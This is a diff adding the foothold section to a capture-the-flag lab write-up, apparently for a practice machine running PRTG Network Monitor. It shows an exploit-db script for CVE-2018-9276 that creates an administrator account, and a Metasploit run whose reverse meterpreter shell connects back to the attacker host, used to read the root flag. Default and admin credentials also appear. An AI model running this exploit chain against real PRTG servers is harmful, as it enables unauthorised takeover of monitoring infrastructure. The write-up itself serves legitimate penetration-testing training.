@@ -110,7 +110,7 @@ ftp> exit
 221 Goodbye.
                                                                                                                                                                                                                                             
 └─$ cat user.txt  
-11818424d2c2af5e637c4cdaacc740b4
+8e25682870bb77ae73ee7fa02f3ebd35
                                                                                                                                                                                                                                             
 ```
 
@@ -250,6 +250,205 @@ PRTG Network Monitor < 18.1.39.1648 - Stack Overflow (Denial of Service)        
 PRTG Traffic Grapher 6.2.1 - 'url' Cross-Site Scripting                                                                                                     | java/webapps/34108.txt
 ------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Shellcodes: No Results
+└──╼ $./prtg-exploit.sh
+
+[+]#########################################################################[+] 
+[*] Authenticated PRTG network Monitor remote code execution                [*] 
+[+]#########################################################################[+] 
+[*] Date: 11/03/2019                                                        [*] 
+[+]#########################################################################[+] 
+[*] Author: https://github.com/M4LV0   lorn3m4lvo@protonmail.com            [*] 
+[+]#########################################################################[+] 
+[*] Vendor Homepage: https://www.paessler.com/prtg                          [*] 
+[*] Version: 18.2.38                                                        [*] 
+[*] CVE: CVE-2018-9276                                                      [*] 
+[*] Reference: https://www.codewatch.org/blog/?p=453                        [*] 
+[+]#########################################################################[+] 
+
+# login to the app, default creds are prtgadmin/prtgadmin. once athenticated grab your cookie and use it with the script.
+# run the script to create a new user 'pentest' in the administrators group with password 'P3nT3st!' 
+
+[+]#########################################################################[+] 
+ EXAMPLE USAGE: ./prtg-exploit.sh -u http://10.10.10.10 -c "_ga=GA1.4.XXXXXXX.XXXXXXXX; _gid=GA1.4.XXXXXXXXXX.XXXXXXXXXXXX; OCTOPUS1813713946=XXXXXXXXXXXXXXXXXXXXXXXXXXXXX; _gat=1" 
 
 ```
 
+Get cookie information (Q inspect element after login, go to storage Cookies:
+
+![COOKIE](IMG/prtg_cookie.png)
+
+Try to run exploit:
+```shell
+
+```
+```
+
+# FootHold
+
+First try with prtg-exploit.sh script:
+```shell
+└──╼ $cp /usr/share/exploitdb/exploits/windows/webapps/46527.sh ./prtg-exploit.sh
+
+└──╼ $./prtg-exploit.sh http://10.129.43.52 -c "OCTOPUS1813713946=ezFGQkM1NkY1LTk4NUQtNDFGQy1BMkFGLTc4NzRENjg2NzcwRn0%3D"
+
+[+]#########################################################################[+] 
+[*] Authenticated PRTG network Monitor remote code execution                [*] 
+[+]#########################################################################[+] 
+[*] Date: 11/03/2019                                                        [*] 
+[+]#########################################################################[+] 
+[*] Author: https://github.com/M4LV0   lorn3m4lvo@protonmail.com            [*] 
+[+]#########################################################################[+] 
+[*] Vendor Homepage: https://www.paessler.com/prtg                          [*] 
+[*] Version: 18.2.38                                                        [*] 
+[*] CVE: CVE-2018-9276                                                      [*] 
+[*] Reference: https://www.codewatch.org/blog/?p=453                        [*] 
+[+]#########################################################################[+] 
+
+# login to the app, default creds are prtgadmin/prtgadmin. once athenticated grab your cookie and use it with the script.
+# run the script to create a new user 'pentest' in the administrators group with password 'P3nT3st!' 
+
+[+]#########################################################################[+] 
+
+ [*] file created 
+ [*] sending notification wait....
+
+ [*] adding a new user 'pentest' with password 'P3nT3st' 
+ [*] sending notification wait....
+
+ [*] adding a user pentest to the administrators group 
+ [*] sending notification wait....
+
+
+ [*] exploit completed new user 'pentest' with password 'P3nT3st!' created have fun! 
+
+```
+
+MSF option:
+
+```shell
+[msf](Jobs:0 Agents:0) >> search PRTG
+
+Matching Modules
+================
+
+   #  Name                                         Disclosure Date  Rank       Check  Description
+   -  ----                                         ---------------  ----       -----  -----------
+   0  exploit/windows/http/prtg_authenticated_rce  2018-06-25       excellent  Yes    PRTG Network Monitor Authenticated RCE
+
+
+Interact with a module by name or index. For example info 0, use 0 or use exploit/windows/http/prtg_authenticated_rce
+
+[msf](Jobs:0 Agents:0) >> use exploit/windows/http/prtg_authenticated_rce
+[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
+
+[msf](Jobs:0 Agents:0) exploit(windows/http/prtg_authenticated_rce) >> set LHOST 10.10.14.28
+LHOST => 10.10.14.28
+[msf](Jobs:0 Agents:0) exploit(windows/http/prtg_authenticated_rce) >> set RHOST 10.129.43.52
+RHOST => 10.129.43.52
+[msf](Jobs:0 Agents:0) exploit(windows/http/prtg_authenticated_rce) >> set ADMIN_PASSWORD PrTg@dmin2019
+ADMIN_PASSWORD => PrTg@dmin2019
+
+
+[msf](Jobs:0 Agents:0) exploit(windows/http/prtg_authenticated_rce) >> run
+
+[*] Started reverse TCP handler on 10.10.14.28:4444 
+[+] Successfully logged in with provided credentials
+[+] Created malicious notification (objid=2018)
+[+] Triggered malicious notification
+[+] Deleted malicious notification
+[*] Waiting for payload execution.. (30 sec. max)
+[*] Sending stage (175686 bytes) to 10.129.43.52
+[*] Meterpreter session 1 opened (10.10.14.28:4444 -> 10.129.43.52:50180) at 2022-09-11 12:49:58 +0200
+
+(Meterpreter 1)(C:\Windows\system32) > cd C:\
+ > cd Users
+[-] stdapi_fs_chdir: Operation failed: The system cannot find the file specified.
+(Meterpreter 1)(C:\Windows\system32) > cd ..
+(Meterpreter 1)(C:\Windows) > cd ..
+(Meterpreter 1)(C:\) > dir
+Listing: C:\
+============
+
+Mode              Size    Type  Last modified              Name
+----              ----    ----  -------------              ----
+040777/rwxrwxrwx  0       dir   2016-11-21 03:46:10 +0100  $RECYCLE.BIN
+100666/rw-rw-rw-  1024    fil   2019-02-03 05:18:08 +0100  .rnd
+100666/rw-rw-rw-  1       fil   2016-07-16 15:10:17 +0200  BOOTNXT
+040777/rwxrwxrwx  0       dir   2019-02-03 13:05:38 +0100  Documents and Settings
+040777/rwxrwxrwx  0       dir   2016-07-16 15:18:03 +0200  PerfLogs
+040555/r-xr-xr-x  4096    dir   2019-02-26 03:56:41 +0100  Program Files
+040777/rwxrwxrwx  4096    dir   2019-02-03 05:28:57 +0100  Program Files (x86)
+040777/rwxrwxrwx  4096    dir   2021-12-15 15:40:04 +0100  ProgramData
+040777/rwxrwxrwx  0       dir   2019-02-03 13:05:39 +0100  Recovery
+040777/rwxrwxrwx  0       dir   2019-02-03 13:04:49 +0100  System Volume Information
+040555/r-xr-xr-x  4096    dir   2019-02-03 13:08:34 +0100  Users
+040777/rwxrwxrwx  16384   dir   2019-02-26 04:49:57 +0100  Windows
+100444/r--r--r--  389408  fil   2016-11-21 02:59:07 +0100  bootmgr
+040777/rwxrwxrwx  0       dir   2019-02-26 03:15:12 +0100  inetpub
+000000/---------  0       fif   1970-01-01 01:00:00 +0100  pagefile.sys
+
+(Meterpreter 1)(C:\) > cd Users
+(Meterpreter 1)(C:\Users) > dir
+Listing: C:\Users
+=================
+
+Mode              Size  Type  Last modified              Name
+----              ----  ----  -------------              ----
+040777/rwxrwxrwx  8192  dir   2019-02-26 04:58:46 +0100  Administrator
+040777/rwxrwxrwx  0     dir   2016-07-16 15:28:00 +0200  All Users
+040555/r-xr-xr-x  8192  dir   2019-02-03 13:05:38 +0100  Default
+040777/rwxrwxrwx  0     dir   2016-07-16 15:28:00 +0200  Default User
+040555/r-xr-xr-x  4096  dir   2019-02-03 05:35:49 +0100  Public
+100666/rw-rw-rw-  174   fil   2016-07-16 15:16:27 +0200  desktop.ini
+
+(Meterpreter 1)(C:\Users) > cd Administrator
+(Meterpreter 1)(C:\Users\Administrator) > dir
+Listing: C:\Users\Administrator
+===============================
+
+Mode              Size    Type  Last modified              Name
+----              ----    ----  -------------              ----
+040777/rwxrwxrwx  0       dir   2019-02-03 13:08:34 +0100  AppData
+040777/rwxrwxrwx  0       dir   2019-02-03 13:08:34 +0100  Application Data
+040555/r-xr-xr-x  0       dir   2019-02-03 13:08:38 +0100  Contacts
+040777/rwxrwxrwx  0       dir   2019-02-03 13:08:34 +0100  Cookies
+040555/r-xr-xr-x  0       dir   2019-02-03 05:35:23 +0100  Desktop
+040555/r-xr-xr-x  4096    dir   2019-02-03 13:08:39 +0100  Documents
+040555/r-xr-xr-x  0       dir   2019-02-03 13:08:39 +0100  Downloads
+040555/r-xr-xr-x  0       dir   2019-02-03 13:08:38 +0100  Favorites
+040555/r-xr-xr-x  0       dir   2019-02-03 13:08:39 +0100  Links
+040777/rwxrwxrwx  0       dir   2019-02-03 13:08:34 +0100  Local Settings
+040555/r-xr-xr-x  0       dir   2019-02-03 13:08:39 +0100  Music
+040777/rwxrwxrwx  0       dir   2019-02-03 13:08:34 +0100  My Documents
+100666/rw-rw-rw-  262144  fil   2022-09-11 12:35:25 +0200  NTUSER.DAT
+100666/rw-rw-rw-  65536   fil   2019-02-03 13:08:35 +0100  NTUSER.DAT{4c7e0ce3-af90-11e6-b29b-95ada9568386}.TM.blf
+100666/rw-rw-rw-  524288  fil   2019-02-03 13:08:35 +0100  NTUSER.DAT{4c7e0ce3-af90-11e6-b29b-95ada9568386}.TMContainer00000000000000000001.regtrans-ms
+100666/rw-rw-rw-  524288  fil   2019-02-03 13:08:35 +0100  NTUSER.DAT{4c7e0ce3-af90-11e6-b29b-95ada9568386}.TMContainer00000000000000000002.regtrans-ms
+040777/rwxrwxrwx  0       dir   2019-02-03 13:08:34 +0100  NetHood
+040555/r-xr-xr-x  0       dir   2019-02-03 13:08:38 +0100  Pictures
+040777/rwxrwxrwx  0       dir   2019-02-03 13:08:34 +0100  PrintHood
+040777/rwxrwxrwx  0       dir   2019-02-03 13:08:34 +0100  Recent
+040555/r-xr-xr-x  0       dir   2019-02-03 13:08:39 +0100  Saved Games
+040555/r-xr-xr-x  0       dir   2019-02-03 13:08:39 +0100  Searches
+040777/rwxrwxrwx  0       dir   2019-02-03 13:08:34 +0100  SendTo
+040777/rwxrwxrwx  0       dir   2019-02-03 13:08:34 +0100  Start Menu
+040777/rwxrwxrwx  0       dir   2019-02-03 13:08:34 +0100  Templates
+040555/r-xr-xr-x  0       dir   2019-02-26 04:06:13 +0100  Videos
+100666/rw-rw-rw-  98304   fil   2019-02-03 13:08:34 +0100  ntuser.dat.LOG1
+100666/rw-rw-rw-  114688  fil   2019-02-03 13:08:34 +0100  ntuser.dat.LOG2
+100666/rw-rw-rw-  20      fil   2019-02-03 13:08:34 +0100  ntuser.ini
+
+(Meterpreter 1)(C:\Users\Administrator) > cd Desktop
+(Meterpreter 1)(C:\Users\Administrator\Desktop) > dir
+Listing: C:\Users\Administrator\Desktop
+=======================================
+
+Mode              Size  Type  Last modified              Name
+----              ----  ----  -------------              ----
+100666/rw-rw-rw-  282   fil   2019-02-03 13:08:39 +0100  desktop.ini
+100444/r--r--r--  34    fil   2022-09-11 12:13:30 +0200  root.txt
+
+(Meterpreter 1)(C:\Users\Administrator\Desktop) > cat root.txt
+9c75297d5d7531895b6776dbf4917ddd
+(Meterpreter 1)(C:\Users\Administrator\Desktop) > 
+```
